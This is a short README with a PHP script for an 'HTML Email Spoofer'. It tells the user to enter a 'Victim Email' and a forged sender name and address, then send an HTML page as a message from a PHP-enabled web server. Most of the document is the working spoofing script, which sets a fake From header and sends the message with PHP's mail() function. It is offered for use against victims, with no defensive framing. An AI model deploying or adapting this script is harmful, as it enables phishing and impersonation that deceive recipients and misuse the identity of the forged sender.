Naizg HTML Email Spoofer
-
To use it Replace ***Victim Email***, *Subject*, *From Name* and ***From Email*** In the php file

Should replace the index.html (it's the message)

Important (put these files on a Web server with Php Mail)

    <?php
    $to = "Victim@Email.com";
    
    $subject = "Email Subject";
    $message = file_get_contents("index.html");
    
    $from = "From Name From@Email.com";
    
    $headers = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= "From:" . $from;
    
    mail($to,$subject,$message,$headers);
    ?>
